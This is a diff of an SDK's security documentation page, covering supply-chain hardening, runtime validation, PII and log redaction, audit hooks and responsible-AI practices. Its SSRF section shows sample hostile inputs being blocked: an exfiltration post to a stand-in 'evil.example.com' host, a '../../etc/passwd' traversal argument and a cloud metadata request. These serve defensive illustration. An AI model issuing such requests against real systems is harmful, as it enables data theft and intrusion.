@@ -1,65 +1,256 @@
 ---
 title: Security
-description: Hardened supply chain, zero-CVE artifacts, and runtime protection measures.
+description: Supply chain hardening, zero-CVE artifacts, runtime protection, and responsible AI practices.
 ---
 
-# Security & Compliance
+# Security & Responsible AI
 
-Tekimax SDK is designed with a "Secure by Default" philosophy, leveraging modern supply chain security practices to ensure integrity from build to runtime.
+tekimax-omat is designed for organizations where trust matters — nonprofits, civic tech, healthcare, education, and public-sector teams where participant data, equity, and accountability are non-negotiable. That means a hardened supply chain, strict runtime validation, and built-in tools for responsible AI deployment.
+
+---
 
 ## Supply Chain Hardening
 
 ### Chainguard Images
-Our runtime and build artifacts are based on [Chainguard Images](https://www.chainguard.dev/), which are:
-- **Minimal**: Stripped of operating system shell, package managers, and other unnecessary binaries. This eliminates entire categories of exploits (shell injection, privilege escalation via installed tooling).
-- **Hardened**: Designed to reduce the attack surface significantly.
-- **Zero CVEs**: Rebuilt daily to patch upstream vulnerabilities immediately — so you inherit fixes without waiting for a manual image update.
+
+Build artifacts are based on [Chainguard Images](https://www.chainguard.dev/):
+- **Minimal** — no shell, no package managers, no unnecessary binaries. Entire classes of exploits (shell injection, privilege escalation) are structurally impossible.
+- **Zero CVEs** — rebuilt daily to patch upstream vulnerabilities. You inherit fixes without manual intervention.
 
 ### Artifact Signing (Cosign)
-All build artifacts are signed using **Cosign** (part of the Sigstore project). This allows you to verify that the SDK code you are running is exactly what was built by our CI/CD pipeline, with no tampering.
 
-## Vulnerability Management
+All build artifacts are signed with **Cosign** (Sigstore). Verify that what you're running is exactly what was built by the CI pipeline — no tampering possible.
 
 ### Continuous Scanning (Trivy)
-We employ **Trivy** in our CI/CD pipelines to continuously scan our dependencies and build artifacts for vulnerabilities.
-- **Frequency**: Every commit and nightly schedule.
-- **Policy**: Builds fail immediately if `CRITICAL` or `HIGH` vulnerabilities are detected.
-- **Scope**: Scans cover both OS-level packages and Node.js/npm dependencies.
+
+Trivy scans every commit and on a nightly schedule. Builds fail immediately on `CRITICAL` or `HIGH` vulnerabilities across OS packages and npm dependencies.
+
+---
 
 ## Runtime Protection
 
-### Type Safety & Validation (Zod)
-Unlike standard SDKs, Tekimax enforces strict runtime validation using **Zod** schemas.
-- **Spec-Driven**: All schemas are **generated directly from the OpenAPI specification**, ensuring 100% compliance with the API contract.
-- **Input Validation**: Malformed requests are rejected before they leave your application.
-- **Output Sanitization**: Unexpected responses from upstream providers are caught and handled gracefully.
+### Strict TypeScript
 
-### Strict TypeScript Configuration
-The SDK is built with the strictest TypeScript settings enabled to prevent common classes of bugs:
-- `strict: true`: Enables strict null checks and no implicit any — catches `null`/`undefined` bugs at compile time instead of runtime.
-- `noUncheckedIndexedAccess: true`: Forces developers to handle cases where array/object access might return `undefined`. Without this flag, `arr[0]` has type `T`; with it, the type is `T | undefined`, preventing silent runtime crashes on empty arrays.
+The SDK compiles with the strictest TypeScript settings:
+
+- `strict: true` — strict null checks, no implicit `any`
+- `noUncheckedIndexedAccess: true` — array access returns `T | undefined`, preventing silent crashes
+
+### Zod Validation
+
+All schema definitions are validated with **Zod** at runtime:
+- Input validation catches malformed requests before any network call
+- Assessment feedback is validated against `formativeFeedbackSchema` on every `assess()` call
+- Invalid provider responses are caught and surfaced with clear errors
+
+### Hardened JSON Parsing
+
+All `JSON.parse` calls on external or cached data are wrapped in try/catch with graceful recovery. Corrupted Redis cache entries are automatically evicted rather than crashing the process.
 
 ### Minimal Dependency Footprint
-We aggressively minimize third-party dependencies to reduce the potential attack surface. Each dependency is a potential supply-chain vector, so fewer is better.
-- **Core Runtime**: `zod` (validation) and `eventsource-parser` (SSE streaming).
-- **Provider SDKs**: `openai`, `@anthropic-ai/sdk`, `@google/generative-ai`, `ollama` — one per provider, each an official first-party package.
-- **Zero bloat**: No heavy frameworks, lodash, or unused utility libraries.
 
-### Configuration Best Practices
-Never hardcode API keys. All providers require explicit `apiKey` parameters — they do **not** auto-read environment variables. This is intentional: implicit env-var reading can lead to accidental key leakage across environments (e.g., a CI build picking up production keys).
+| Layer | Dependencies |
+|---|---|
+| Core runtime | `zod`, `eventsource-parser` |
+| Provider SDKs | `openai`, `@anthropic-ai/sdk`, `@google/generative-ai`, `ollama` |
+| Dev/build | TypeScript, tsup — never in production bundle |
+
+No lodash. No frameworks. No bloat.
+
+---
+
+## API Key Management
+
+Never hardcode API keys. Providers require explicit `apiKey` parameters — they do **not** auto-read environment variables. This is intentional: implicit env-var reading can silently use production keys in CI.
 
 ```typescript
-// ✅ Good: Explicit environment variable
-const client = new Tekimax({
-  provider: new AnthropicProvider({
-     apiKey: process.env.ANTHROPIC_API_KEY!
-  })
+// ✅ Explicit environment variable
+const provider = new OpenAIProvider({
+  apiKey: process.env.OPENAI_API_KEY!
 });
 
-// ❌ Bad: Hardcoded secret
-const client = new Tekimax({
-  provider: new AnthropicProvider({
-    apiKey: "sk-ant-..." // Never do this — it will end up in source control.
-  })
+// ❌ Never do this — ends up in source control, logs, and error reports
+const provider = new OpenAIProvider({
+  apiKey: 'sk-...'
 });
 ```
+
+For browser/frontend use, **always proxy through your backend**:
+
+```typescript
+// In development only:
+new OpenAIProvider({ apiKey: process.env.NEXT_PUBLIC_KEY!, dangerouslyAllowBrowser: true })
+
+// In production: route through /api/chat on your server
+```
+
+---
+
+## PII Protection
+
+`PIIFilterPlugin` redacts sensitive patterns from messages **before they leave your application** — so personal data never reaches any AI provider. This is essential for programs handling participant data in healthcare, social services, education, and workforce development.
+
+```typescript
+import { PIIFilterPlugin, Tekimax } from 'tekimax-omat';
+
+const client = new Tekimax({
+  provider,
+  plugins: [new PIIFilterPlugin()]
+});
+
+// Input:  "My participant's SSN is 123-45-6789 and they can be reached at jane@clinic.org"
+// Sent:   "My participant's SSN is [REDACTED SSN] and they can be reached at [REDACTED EMAIL]"
+```
+
+**Patterns redacted:** emails, SSNs (`xxx-xx-xxxx`), phone numbers, credit card numbers. All patterns are written to avoid catastrophic backtracking (ReDoS) on large inputs. The plugin handles both plain-text messages and multi-part `ContentPart[]` messages (vision requests with mixed text and image parts).
+
+> **Also sanitize API responses.** If your backend API returns PII (e.g., participant records), sanitize the response before returning it to the model as a tool result. See the [API Skills guide](/docs/guides/api-skills) for the `onSkillResult` pattern.
+
+---
+
+## SSRF Protection
+
+Both `ProvisionPlugin` and `ApiSkillPlugin` block Server-Side Request Forgery at multiple layers:
+
+**Layer 1 — Host validation:** Absolute URLs must match the configured `apiUrl` host. Cross-origin injection is rejected immediately.
+
+**Layer 2 — Private IP blocking:** Both plugins block requests to private, loopback, and cloud metadata addresses regardless of how the URL was constructed:
+
+| Range | Blocked |
+|---|---|
+| `127.0.0.0/8` | Loopback |
+| `10.0.0.0/8` | Private network |
+| `172.16.0.0/12` | Private network |
+| `192.168.0.0/16` | Private network |
+| `169.254.0.0/16` | Link-local / AWS instance metadata |
+| `0.0.0.0/8` | Reserved |
+| `::1`, `[::1]` | IPv6 loopback |
+| `localhost`, `*.local` | Hostname loopback |
+
+```typescript
+// These all throw immediately — before any network call
+
+provision.post('https://evil.example.com/exfil', data);
+// Error: ProvisionPlugin: absolute URL host "evil.example.com" does not match configured apiUrl host "api.yourorg.com"
+
+skills.execute('my_skill', { id: '../../etc/passwd' });
+// Path traversal in args won't reach private IPs — URL is SSRF-checked after interpolation
+
+skills.registerEndpoint({ url: 'http://169.254.169.254/metadata', ... });
+// Blocked at execution time — cloud metadata endpoint
+```
+
+---
+
+## Tool Argument Sanitization
+
+`LoggerPlugin` automatically redacts sensitive values before logging tool arguments. Any argument key matching `apikey`, `secret`, `token`, `password`, `auth`, `credential`, or `bearer` is replaced with `[REDACTED]`:
+
+```typescript
+// Tool called with: { userId: 'P-1024', apiKey: 'sk-abc123', query: 'programs' }
+// Logged as:        { userId: 'P-1024', apiKey: '[REDACTED]', query: 'programs' }
+```
+
+This prevents accidental credential exposure in console logs, log aggregators, and monitoring tools.
+
+---
+
+## Audit Logging
+
+Use `AIActionTagPlugin` and `ApiSkillPlugin`'s audit hooks to build a complete trail of AI-initiated actions. This is required for compliance in many regulated contexts (FERPA, HIPAA, grant reporting).
+
+### Tag every AI operation
+
+```typescript
+import { AIActionTagPlugin } from 'tekimax-omat';
+
+const client = new Tekimax({
+  provider,
+  plugins: [
+    new AIActionTagPlugin({
+      onTag: (tag, context) => {
+        auditLog.record({
+          source: tag.source,            // 'ai'
+          operation: tag.operation,      // 'create' | 'read' | 'update' | 'delete' | 'none'
+          confidence: tag.confidence,    // 'high' (tool name) | 'low' (text inference)
+          model: tag.model,
+          timestamp: tag.timestamp,
+          userId: context.requestOptions?.userId,
+        });
+      }
+    })
+  ]
+});
+```
+
+### Log every API skill call
+
+```typescript
+import { ApiSkillPlugin } from 'tekimax-omat';
+
+const skills = new ApiSkillPlugin({
+  onSkillCall: (name, args) => {
+    auditLog.record({
+      event: 'skill_invoked',
+      skill: name,
+      args,                // Log what the model sent
+      ts: Date.now(),
+    });
+  },
+  onSkillResult: (name, result) => {
+    auditLog.record({
+      event: 'skill_completed',
+      skill: name,
+      status: result.status,
+      ok: result.ok,
+      latency: result.latency,
+      error: result.error,
+    });
+  },
+});
+```
+
+---
+
+## Responsible AI Practices
+
+### Data Minimization in Assessments
+
+`FairnessAuditPlugin` never sends demographic data to AI providers. Demographics are stored locally for equity reporting only — the model never sees them:
+
+```typescript
+const response: StudentResponse = {
+  id: 'r-001',
+  modality: 'text',
+  text: 'Student essay...',
+  demographics: {
+    // Stored for fairness analysis only — never included in the AI prompt
+    ellStatus: 'intermediate',
+    subgroup: ['FRL'],
+  }
+};
+```
+
+### Privacy-Preserving Group Reporting
+
+`FairnessAuditPlugin` has a `minGroupSize` threshold (default: 5). Groups smaller than this are excluded from reports — protecting individuals who may be the only member of a demographic category in a small cohort.
+
+### Asset-Based Feedback
+
+The `AssessmentPipeline` system prompt is built around asset-based framing principles — because AI feedback that only identifies deficits causes real harm:
+
+1. Lead with what the person **can** do
+2. Cite specific evidence from their work
+3. Give concrete, achievable next steps
+4. Encouragement is required — every person deserves to feel capable
+5. For ELL participants, acknowledge linguistic strengths explicitly
+
+The rubric and system prompt work together. Validators (`RubricValidatorPlugin`) enforce that every piece of feedback contains strengths, next steps, and encouragement — an error is raised if any are missing.
+
+### Least-Privilege API Access
+
+When registering skills with `ApiSkillPlugin`, only expose the operations the model actually needs. Don't register admin endpoints, bulk delete operations, or sensitive data exports unless the use case explicitly requires them. The model can only call what you register.
+
+### Human in the Loop
+
+`AIActionTagPlugin` marks every model-generated response with `source: 'ai'`. Use this in your UI to clearly distinguish AI-generated content from human-authored content — your users deserve to know when AI is acting on their behalf.
